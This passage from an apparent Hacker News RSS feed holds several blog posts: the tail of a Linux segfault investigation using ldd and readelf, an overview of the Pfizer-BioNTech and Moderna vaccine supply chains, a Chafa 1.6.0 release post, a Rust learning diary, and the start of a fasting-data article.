	libavutil.so.56 =&gt; /lib64/libavutil.so.56 (0x00007f0a3e036000)
...
	libsamba-sockets-samba4.so =&gt; /usr/lib64/samba/libsamba-sockets-samba4.so (0x00007fd6af4b7000)
...
</pre>


<p>I truncated the output because it spit out a very long list of libraries. As we can see from ldd’s output, obs-ios-camera-source.so depends on libsamba-sockets-samba4.so. ldd lists all recursive dependencies as well, and I couldn’t find any references to “samba” in the plugin source code, so this was likely an indirect dependency instead. I confirmed this by using <a href="https://en.wikipedia.org/wiki/Readelf" data-type="URL" data-id="https://en.wikipedia.org/wiki/Readelf" target="_blank" rel="noreferrer noopener">readelf</a> to show only the direct dependencies:</p>


<pre title="">[fedora@fedora33 build]$ readelf -d obs-ios-camera-source.so | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libobs.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libavcodec.so.58]
 0x0000000000000001 (NEEDED)             Shared library: [libavutil.so.56]
 0x0000000000000001 (NEEDED)             Shared library: [libobs-frontend-api.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libstdc++.so.6]
 0x0000000000000001 (NEEDED)             Shared library: [libm.so.6]
 0x0000000000000001 (NEEDED)             Shared library: [libgcc_s.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
</pre>


<p>At this point I used ldd and readelf to walk through the tree of dependencies and figure out what was actually linking against the Samba libraries. I later learned that I could have installed lddtree (part of the pax-utils package) to do this automatically. Either way, this led me to discover that the Samba libraries were being included through libsmbclient, which was a dependency of libavformat (part of FFmpeg). libavformat is a dependency of libobs.</p>



<p>Repeating this experiment on Ubuntu showed that libavformat on Ubuntu does not depend on libsmbclient. This explains why I couldn’t reproduce the issue on Ubuntu. So why does Fedora’s (well, <a href="https://rpmfusion.org/" data-type="URL" data-id="https://rpmfusion.org/" target="_blank" rel="noreferrer noopener">RPM Fusion</a>‘s) version of libavformat depend on libsmbclient?</p>



<p>It turns out that it’s a compile-time option for FFmpeg. <a rel="noreferrer noopener" href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/libsmbclient.c" data-type="URL" data-id="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/libsmbclient.c" target="_blank">libavformat contains code for talking with Windows servers using libsmbclient</a>, but it’s an optional thing that you can choose to enable at compile time. Clearly Ubuntu chooses not to enable it, but RPM Fusion does. <a href="https://lists.rpmfusion.org/archives/list/rpmfusion-commits@lists.rpmfusion.org/thread/57UYP4VFY3VCJFU3DGPHLUE3JPYP73HJ/">Actually, I found the exact post on RPM Fusion’s commits mailing list</a> where the patch was added for enabling SMB support in FFmpeg. This patch is what led to the whole issue happening. If Ubuntu’s version of FFmpeg was being built with SMB support, we would have seen this a long time ago. This commit to RPM Fusion was made on December 31, 2020, which explains why rrondeau had only recently begun seeing the problem.</p>



<p>The root cause here is that the obs-ios-camera-source plugin was linking against two libraries that both provided a function named socket_send: libsamba-sockets-samba4 (indirectly through libobs) and libusbmuxd. libusbmuxd was being linked statically, but <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/62884945/shared-library-symbol-conflicts-and-static-linking-on-linux" data-type="URL" data-id="https://stackoverflow.com/questions/62884945/shared-library-symbol-conflicts-and-static-linking-on-linux" target="_blank">that doesn’t prevent functions in it from being resolved through dynamic linking rules anyway</a>. So even though libusbmuxd was a static library with its own internal implementation of socket_send, it was using …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/">https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/</a></em></p>]]>
            </description>
            <link>https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818126</guid>
            <pubDate>Mon, 18 Jan 2021 04:25:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analysing Algorithms Efficiently: Simple Stupid Method]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818110">thread link</a>) | @luciferreeves
<br/>
January 17, 2021 | https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time | <a href="https://web.archive.org/web/*/https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818110</guid>
            <pubDate>Mon, 18 Jan 2021 04:23:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring the Supply Chain of the Pfizer/BioNTech and Moderna Covid-19 Vaccines]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25817984">thread link</a>) | @tchalla
<br/>
January 17, 2021 | https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/ | <a href="https://web.archive.org/web/*/https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <div>
  <p>
     ● 10 Jan 2021
  </p>
  
  <p><em>Sections of this post were co-authored by <a href="https://www.linkedin.com/in/cornelia-scheitz/">Cornelia Scheitz</a>. Last updated on January 19, 2021.</em></p>

<p>Bert Hubert’s excellent and widely shared article about <a href="https://berthub.eu/articles/posts/reverse-engineering-source-code-of-the-biontech-pfizer-vaccine/">Reverse Engineering the source code of the Pfizer-BioNTech SARS-CoV-2 Vaccine</a> is all it took to turn hundreds of software engineers and other Silicon Valley types into armchair vaccine experts overnight! Jokes aside, the article explains the 4284 base pair long mRNA inside the Pfizer-BioNTech’s COVID-19 vaccine for those who are more familiar with software than molecular biology.</p>

<p>Bert’s article is primarily about the biology of the vaccine, how it relates to the virus and how it works in the human body, but there’s this one sentence about vaccine production:</p>

<blockquote>
  <p>At the very beginning of the vaccine production process, someone uploaded this code to a DNA printer (yes), which then converted the bytes on disk to actual DNA molecules.</p>
</blockquote>

<p>Next to it is a picture of a <a href="https://codexdna.com/products/bioxp-system/">CodexDNA BioXP</a> device that is advertised as producing “custom DNA fragments of up to 7,000 base pairs”. Could this be the next <a href="https://en.wikipedia.org/wiki/Makers:_The_New_Industrial_Revolution">distributed manufacturing revolution</a>? This time with DNA printers making COVID-19 vaccines in our garages instead of 3D printers and plastic widgets?</p>

<p>I’ll start with the bad news: Nobody will be making an mRNA vaccine in their garage any time soon.</p>

<p>The following text is a collection of notes I wrote down while exploring the process for manufacturing and distributing the two new vaccines that have appeared all over the news and in more and more people’s arms over the recent weeks. I started reading about mRNA but quickly found myself on tangents about glass vials and temperature tracking devices.</p>

<p>This text was written over a week worth of evenings in early January 2021. It covers the two vaccines currently authorized for distribution in the United States where I live: One by Pfizer-BioNTech and one by Moderna. Several other mRNA based COVID-19 vaccines <a href="https://www.nytimes.com/interactive/2020/science/coronavirus-vaccine-tracker.html">are in various stages of clinical trials</a> and are likely similar to those covered here in some ways and different in others.</p>

<p>It is unlikely that I got everything right. Corrections and suggestions are welcome, please email jn@jonasneubert.com.</p>

<div>
    
        <p><img src="https://blog.jonasneubert.com/assets/2021/2021-01-10-moderna-vaccine-in-fridge.jpg" alt="Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/"></p><p>Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/</p>
    
</div>

<h2 id="ingredients-list">Ingredients List</h2>

<p>The list of ingredients, or “bill of materials” in engineering parlance, is a good starting point for understanding the supply chain of any product. The ingredient lists for both Pfizer-BioNTech and Moderna’s vaccines are public and have been widely reported.</p>

<p>The Pfizer-BioNTech vaccine is also known under its code name “BNT162b2”, it’s registered trademark “Corminaty”, and its international non-proprietary name “Tozinameran”. The list of ingredients can be found in information material available on the various country-specific product websites on <a href="https://www.cvdvaccine.com/">www.cvdvaccine.com</a> or government websites like that of the <a href="https://www.gov.uk/government/publications/regulatory-approval-of-pfizer-biontech-vaccine-for-covid-19/information-for-healthcare-professionals-on-pfizerbiontech-covid-19-vaccine">UK’s MHRA</a>. There’s also a <a href="https://en.wikipedia.org/wiki/Tozinameran#Manufacturing">Wikipedia page</a>.</p>

<p>The Moderna vaccine is also known as “mRNA-1273”, but appears to lack a brand name other than “Moderna COVID-19 vaccine” which is what it says on the product label. The list of ingredients can be found on the <a href="https://www.modernatx.com/covid19vaccine-eua/">EUA factsheet on Moderna’s website</a>, or in these <a href="https://www.fda.gov/media/144434/download">FDA meeting notes</a>. It, too, has a <a href="https://en.wikipedia.org/wiki/MRNA-1273">Wikipedia entry</a>.</p>

<p>The two vaccines share some ingredients but not all. The following table is my attempt to sort the available information and compare the two.</p>

<table>
  <tbody><tr>
   <td>
   </td>
   <td>Pfizer-BioNTech
   </td>
   <td>Moderna
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Active Ingredient</span></strong>
   </td>
  </tr>
  <tr>
   <td>Comirnaty mRNA
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>mRNA-1273 mRNA
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Lipids</span></strong>
   </td>
  </tr>
  <tr>
   <td>Cholesterol
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>1,2-distearoyl-sn-glycero-3-phosphocholine (DSPC)
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>(4-hydroxybutyl)azanediyl)bis(hexane-6,1-diyl)bis(2- hexyldecanoate) (ALC-3015)
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>2-[(polyethylene glycol)-2000]-N,N-ditetradecylacetamide (ALC-0159)
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Lipid SM-102
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>1,2-dimyristoyl-rac-glycero-3-methoxypolyethylene glycol-2000 (PEG2000-DMG)
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Buffer</span></strong>
   </td>
  </tr>
  <tr>
   <td>potassium chloride
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>monobasic potassium phosphate
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>sodium chloride
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>basic sodium phosphate dihydrate
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>tromethamine (tris(hydroxymethyl)aminomethane)
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>tromethamine hydrochloride
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>acetic acid
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>sodium acetate
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>water
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Other</span></strong>
   </td>
  </tr>
  <tr>
   <td>sucrose
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
</tbody></table>

<p>In addition to what’s in the vaccine vial, Pfizer-BioNTech needs to be diluted with sodium chloride shortly before use (more about that below). The Moderna vaccine does not seem to require such a “DIY assembly” step.</p>

<p>Now that we know all the ingredients, let’s go shopping.</p>

<p>Disclaimer: Please don’t perform chemistry or create pharmaceuticals unless you have the appropriate safety training and equipment. I include links to online shops below, but note that they sell “for research use only” and will verify your affiliation with a research organization before taking your business.</p>

<h2 id="mrna">mRNA</h2>

<p>To make RNA, you start by making DNA. This makes sense if you know the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a> which, for the purposes of this article, can be simplified to “DNA makes RNA, and RNA makes protein”.  Making DNA is a known, stable process in 3 steps:</p>

<ol>
  <li><strong>Create:</strong> Synthesize a small number of copies of the desired DNA, somehow. There are vendors for this sort of thing such as <a href="https://twistbioscience.com/">Twist Bioscience</a> just down the street from my apartment when I lived in San Francisco.</li>
  <li><strong>Copy:</strong>
    <ol>
      <li>Insert this DNA into innocent <a href="https://en.wikipedia.org/wiki/Escherichia_coli">E. coli bacteria</a> by means of <a href="https://en.wikipedia.org/wiki/Electroporation">electroporation</a>, i.e. zapping them.</li>
      <li>Put those bacteria into a stainless steel growth chamber full of nutrients and let them multiply for four days.</li>
      <li>Drain the vat, kill the bacteria, and <a href="https://en.wikipedia.org/wiki/DNA_extraction">extract the DNA</a>. Depending on growth chamber volume, this may take one week or longer.</li>
    </ol>
  </li>
  <li><strong>Verify:</strong> Perform several tests to confirm that the DNA you got is the DNA you wanted. There’s no need for me to explain how testing for the presence of specific DNA sequences works, y’all learned that nine months ago when you did your reading about how COVID-19 tests work.</li>
</ol>

<p>This yields grams of DNA and what is needed are bags of mRNA. mRNA is the most discussed ingredient of the vaccine for three reasons:</p>

<ol>
  <li>mRNA is the active ingredient of the vaccine.</li>
  <li>It is the first time an mRNA vaccine has been approved and is now produced at scale.</li>
  <li>The skills to produce mRNA at scale and the associated supply chain are new.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
The conversion process from DNA to mRNA in living cells is well understood. However, doing it at scale, in a factory, and with a long shelf-life is still an area of development. To multiply the DNA we utilized E.coli and this tiny organism comes with all components needed for the job. The same process does not work for making mRNA for the vaccine. Instead, the DNA gets combined with nucleotides, polymerase, and special enzymes that protect the mRNA.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
</ol>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Nucleotide">Nucleotides</a> are the raw building blocks for the mRNA.</li>
  <li>RNA <a href="https://en.wikipedia.org/wiki/Polymerase">Polymerases</a> read DNA and translate it to mRNA using these nucleotides.</li>
  <li>Enzymes add a cap and a tail to the mRNA to protect it.</li>
</ul>

<p>The third part, protecting the mRNA, is the crux of the matter. mRNA is not very stable especially at the ends. If you lose the first and last word of a sentence its meaning may be lost entirely. The same can happen here and the vaccine would not work anymore. To protect the beginning of the mRNA statement, a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5’ cap</a> is added using a mRNA Cap 2′-O-Methyltransferase and the vaccinia capping enzyme (VCE). (The “vaccinia” in the name has nothing to do with vaccines.) To protect the end of the mRNA we add a <a href="https://en.wikipedia.org/wiki/Polyadenylation">poly(A) tail</a> to the message using a Poly(A)Polymerase. New England Biolabs’ online store lists prices for <a href="https://www.neb.com/products/m0366-mrna-cap2-o-methyltransferase">mRNA Cap</a>, <a href="https://www.neb.com/products/m2080-vaccinia-capping-system">VCE</a>, and <a href="https://www.neb.com/products/m0276-ecoli-poly-a-polymerase">Poly(A)Polymerase</a>.</p>

<p>All ingredients of the vaccine besides the mRNA are “<a href="https://en.wikipedia.org/wiki/Excipient">excipients</a>”, substances whose purpose is somehow related to getting the vaccine from the factory into a human cell.</p>

<h2 id="lipids">Lipids</h2>

<p>Lipids are fatty molecules. Each of the two vaccines contains four types of lipid. Cholesterol, phosphatidylcholine, an ionizable cationic lipid, and PEGylated phospholipds. In the vaccine, these lipids form a capsule around the RNA called <a href="https://en.wikipedia.org/wiki/Solid_lipid_nanoparticle">lipid nanoparticle</a> (LNP) that protects it from the hostile environment until it is inside a human cell.</p>

<p>Both Pfizer-BioNTech and Moderna use the same structural components which are already approved in many drugs.</p>

<ul>
  <li><strong>DSPC</strong>, full name <a href="https://en.wikipedia.org/wiki/Distearoylphosphatidylcholine">Distearoylphosphatidylcholine</a> or 1,2-distearoyl-sn-glycero-3-phosphocholine, is the main component of the lipid bilayer that protects the mRNA.</li>
  <li><strong>Cholesterol</strong> is natural to the human body. In the vaccine it is used to achieve optimal liposome formation and structure.</li>
</ul>

<p>The other two ingredients are used to optimize the LNPs for its cargo and the delivery<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> and are novel or uncommon in drug formulation.</p>

<ul>
  <li><strong>Cationic</strong>, or positively charged, lipids bind to and help stabilize the negatively charged mRNA during assembly. Once inside the cell, the cell’s different pH environment triggers the release of mRNA.
    <ul>
      <li>
        <p>Pfizer-BioNTech uses <a href="https://en.wikipedia.org/wiki/ALC-0315">ALC-3015</a> patented by Acuitas Therapeutics, Inc.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>
      </li>
      <li>
        <p>Moderna has a proprietary molecule called Lipid SM-102. Or maybe it isn’t that proprietary, because it might be covered by a patent owned by Arbutus Biopharma.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup> Moderna’s <a href="https://www.modernatx.com/sites/default/files/mRNA-1273-P301-Protocol.pdf">Phase 3 Clinical Study Protocol</a> defines it as “heptadecan-9-yl 8-((2-hydroxyethyl) (6-oxo-6-(undecyloxy)hexyl)amino)octanoate” and calls it a “proprietary ionizable lipid”. In 2018, Moderna researchers published <a href="https://www.cell.com/molecular-therapy-family/molecular-therapy/pdfExtended/S1525-0016(18)30118-7">a Cell paper</a> proposing 10 new lipids, of which SM-102 is number 8, according to <a href="https://twitter.com/1stClef/status/1306653592691113986">this tweet</a>. The paper has a “synthesis” section and supplementary materials which somebody more knowledgeable about such things than I might be able to reproduce. Everyone else will have to purchase it, for example from <a href="https://organixinc.com/lipids/atx001-crrdc-b9dnh-phs3e">Organix Inc at $5,000/100mg</a>.</p>
      </li>
    </ul>
  </li>
  <li><strong>PEGylated phospholipids</strong> help stabilize the LNP and protect it from early detection by our immune system. It ensures the LNPs and thus the mRNA can reach its target.
    <ul>
      <li>Pfizer-BioNTech uses <a href="https://en.wikipedia.org/wiki/ALC-0159">ALC-0159</a>.</li>
      <li>Moderna uses DMG-PEG 2000 or …</li></ul></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</a></em></p>]]>
            </description>
            <link>https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817984</guid>
            <pubDate>Mon, 18 Jan 2021 04:05:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chafa 1.6.0: Wider]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25817485">thread link</a>) | @pabs3
<br/>
January 17, 2021 | https://hpjansson.org/blag/2021/01/18/chafa-1-6-0-wider/ | <a href="https://web.archive.org/web/*/https://hpjansson.org/blag/2021/01/18/chafa-1-6-0-wider/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page"><div id="content"><section id="primary"><main id="main" role="main"><article id="post-615"><div><p>Here’s another one from the <a href="https://hpjansson.org/chafa/">terminal graphics extravaganza</a> dept: <a href="https://github.com/hpjansson/chafa/releases/tag/1.6.0">Chafa 1.6.0</a> brings <a href="https://en.wikipedia.org/wiki/Halfwidth_and_fullwidth_forms">fullwidth</a> character support, so in addition to the usual block elements and ASCII art, you now get some mean <a href="https://en.wikipedia.org/wiki/CJK_Unified_Ideographs">CJK</a> art too. Or grab as many fonts as you can and combine <em>all of the Unicode</em> into one big glorious mess. Chafa can efficiently distinguish between thousands of symbols, so it also runs fast enough for animations — up to a point.</p><p>Since some users want this in environments where it’s not practical to build from source or even to have nice things like GLib, I’ve started adding <a href="https://hpjansson.org/chafa/releases/static/">statically linked builds</a>. These are pretty bare-bones (fewer image loaders, no <a href="https://hpjansson.org/chafa/man/">man page</a>), so <a href="https://repology.org/project/chafa/versions">look to your steadfast distribution</a> first.</p><p>Speaking of distributions, a big thank you to the packagers. Special thanks go to Florian Viehweger for getting in touch re. adding it to OpenBSD ports, and <a href="https://people.debian.org/~lumin/">Mo Zhou</a> (Debian), <a href="https://iodoru.org/">Michael Vetter</a> (openSUSE), <a href="https://github.com/herbygillot">Herby Gillot</a> (MacPorts), <a href="https://github.com/chenrui333">@chenrui</a> and <a href="https://github.com/carlocab">Carlo Cabrera</a> (Homebrew) for getting 1.6 out there before I could even finish this post.</p><h2>So what’s it look like?</h2><p>Obviously if you just want as faithful a reproduction as possible, stick with the default block elements or <a href="https://hpjansson.org/blag/2020/04/01/chafa-1-4-0-now-with-sixels/">sixels</a>. That said, fullwidth characters open up some new artistic possibilities.</p><figure><a href="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide.png"><img loading="lazy" width="1024" height="1280" src="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide-1024x1280.png" alt="Chafa rendering of Dog's Head" srcset="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide-1024x1280.png 1024w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide-240x300.png 240w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide-768x960.png 768w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-dogs-head-wide.png 1114w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure><p>Above, a rendering of <a href="https://archive.org/details/dogheaddegraag" rel="nofollow">Dog’s Head</a> (1920) by Julie de Graag, <a href="https://www.rawpixel.com/image/466876/free-illustration-image-dog-julie-graag-animal">digitally enhanced by Rawpixel</a>. It was generated with the following command line:</p><pre><code lang="bash">chafa --glyph-file /usr/share/fonts/truetype/SourceHanSansCN-Normal.otf \
  --glyph-file /usr/share/fonts/truetype/SourceHanSansJP-Normal.otf \
  --glyph-file /usr/share/fonts/truetype/DroidSansThai.ttf \ 
  --glyph-file /usr/share/fonts/truetype/SourceCodePro-Regular.ttf \
  --symbols 0..fffff-block-border-stipple-dot-geometric \
  -c none -w 9 dog.png</code></pre><p>Although I’d like to include a moderately large built-in selection of fullwidth symbols in a future release, for now you must load fonts with <code>--glyph-file</code> in order to achieve this effect. You also need to enable the Unicode ranges you want and curtail the use of block and border elements with <code>--symbols</code>. The latter is necessary because block elements produce more accurate results and will otherwise pretty much always come out on top during error minimization.</p><figure><a href="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color.png"><img loading="lazy" width="1658" height="1280" src="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color-1658x1280.png" alt="Chafa rendering of Shinjuku Skyscrapers" srcset="https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color-1658x1280.png 1658w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color-300x232.png 300w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color-768x593.png 768w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color-1536x1186.png 1536w, https://hpjansson.org/blag/wp-content/uploads/2020/12/chafa-shinjuku-wide-color.png 1804w" sizes="(max-width: 1658px) 100vw, 1658px"></a></figure><p>This is a rendering of <a href="https://www.flickr.com/photos/wilhelmja/328176297/" rel="nofollow">Shinjuku Skyscrapers</a>, <a href="https://creativecommons.org/licenses/by-sa/2.0/" rel="nofollow">CC-BY-SA</a> Wilhelm Joys Andersen. I used the same set of options to produce it, but left out <code>-c none</code>, resulting in 24-bit color — the default under VTE.</p><p>A side effect of allowing lots of color variation is fewer wide characters. This makes sense considering that they force a pair of cells to have the same color, which is often less accurate than two narrow characters with different colors.</p><h2>彡 (._.) ( l: ) (.-.) ( :l )</h2><p>Like many subjects that look simple at first, terminal graphics makes for a surprisingly deep rabbit hole to be tumbling into. Chafa now spans the gamut from the most basic monochrome ASCII art to fullwidth Unicode, 24-bit color and sixels, and there’s still a lot that can be done to improve it. I will be doing so… slowly.</p><p>If you want to help, feel free to <a href="https://github.com/hpjansson/chafa">send pull requests</a> or <a href="https://github.com/hpjansson/chafa/issues">file any issues you find</a>. I think it’s also at the point where you can achieve various surprising effects, so if you manage to get something particularly cool/sick/downright disgusting out of it, just lob it in my general direction and maybe I’ll include it in a future gallery.</p></div></article></main></section></div></div></div>]]>
            </description>
            <link>https://hpjansson.org/blag/2021/01/18/chafa-1-6-0-wider/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817485</guid>
            <pubDate>Mon, 18 Jan 2021 02:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Journey with Rust and Substrate]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25817475">thread link</a>) | @adibhanna
<br/>
January 17, 2021 | https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate | <a href="https://web.archive.org/web/*/https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A few months ago, I decided to learn <a href="https://www.rust-lang.org/">Rust</a>, mainly because I’m very interested in <a href="https://substrate.dev/">Substrate</a> (a Blockchain framework). At first, I thought it would be an easy task, and that it will take just a few days and I should be up and running. Well, that wasn’t the case, I really struggled with this language, it reminded me of my University days, studying C++, I felt like I don’t know what I’m doing, which is probably very true. </p><p>So, I decided to take a step back and have another take on this process, approach it a bit differently and in a more systematic way. On my first try, I simply went to the docs read everything, and tried some code. That didn’t really help much, it only made me more confused and less motivated.</p><p>The second time around, I decided to follow a “consistent motivation” approach - something that I came up with while writing this post. </p><p>Basically, whenever I feel lost and unmotivated, I’ll go watch some YouTube videos that would excite me. </p><p>Here are some of my favorite: </p><ul><li><p><a href="https://www.youtube.com/channel/UC4ZfpU7QX3iSatYB2GDum5Q">rhymu8354</a></p></li><li><p><a href="https://www.youtube.com/channel/UC_iD0xppBwwsrM9DegC5cQQ">Jon Gjengset</a></p></li><li><p><a href="https://www.youtube.com/channel/UCDmSWx6SK0zCU2NqPJ0VmDQ">David Pedersen</a></p></li></ul><ul><li><p>Read the Rust docs, all of it, without trying any of their coding examples, I just wanted to get a feel of what’s going on in this language - the story behind it. That helped my intuition for whenever I read Rust code. </p></li><li><p>Watched a TON of YouTube videos. I found a bunch of great channels of devs streaming themselves learning and coding Rust. That was inspiring and gave me the desire and motivation to actually try to code things myself.</p></li><li><p>Followed the top Rust accounts on Twitter. The goal was to keep myself up to date with all things Rust. They also share great resources and blog posts.</p></li><li><p>Re-read the Rust docs again, this time I tried all the code they provided, and I spent a lot of time familiarising myself with its syntax.</p></li><li><p>Read as many blog posts as I can find.</p></li><li><p>Read all of Substrate <a href="https://github.com/paritytech/substrate">codebase</a> on Github.</p></li><li><p>Build something with Substrate. </p></li></ul><h2>Lesson Learned</h2><ul><li><p>Don’t give up quickly.</p></li><li><p>Realize that learning takes time.</p></li><li><p>You’re not the only person struggling with learning new things.</p></li><li><p>Read other people’s code (!important).</p></li><li><p>READ THE DOCS.</p></li><li><p>CODE CODE CODE.</p></li></ul><ul><li><p>Great Udemy Course https://www.udemy.com/course/rust-lang/ </p></li><li><p>Official Rust docs https://doc.rust-lang.org/book</p></li><li><p>Rust by example https://doc.rust-lang.org/stable/rust-by-example</p></li></ul><ul><li><p>Substrate Crowdcasts https://www.crowdcast.io/e/substrate-seminar</p></li><li><p>Substrates Tutorials, Knowledge base, and Recipes https://substrate.dev/en/</p></li><li><p>Substrate Developer Hub https://github.com/substrate-developer-hub</p></li><li><p>Polkadot docs https://wiki.polkadot.network/en</p></li></ul><p>This is my first blog post ever, I hope it helps someone with their coding journey. Oh, and I’m definitely open to any feedback that could help me improve the quality of what I’m sharing on this blog. </p><p>Cheers! </p></div></div>]]>
            </description>
            <link>https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817475</guid>
            <pubDate>Mon, 18 Jan 2021 02:24:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Body on a 3-day fast: Real-time data with Basis]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25817380">thread link</a>) | @TheJurgen
<br/>
January 17, 2021 | https://basishealth.io/blog/real-time-fasting-data-with-basis | <a href="https://web.archive.org/web/*/https://basishealth.io/blog/real-time-fasting-data-with-basis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="single-content-content"><p>Caloric restriction is the practice of taking fewer calories than total daily energy needs. Caloric restriction without malnutrition is the most effective non-pharmacological intervention that enhances longevity and healthspan in numerous species. It has been proven to reduce oxidative stress through various pathways and a growing body of evidence shows that sustained periods of caloric restriction without malnutrition improves risk factors involved in the pathophysiology of type 2 diabetes, cardiovascular diseases, cancer, and neurological disorders in humans. (Weindruch, 1996)</p><p>But chronic caloric restriction is difficult to sustain and newer dietary strategies such as intermittent fasting and protein restriction have emerged as alternative approaches that still improve markers of aging. The most popular type of caloric restriction applied today is a 16:8 Time-Restricted Feeding schedule i.e. no eating for 16 hours, eat for 8 hours. While difficult for some to get started, Intermittent 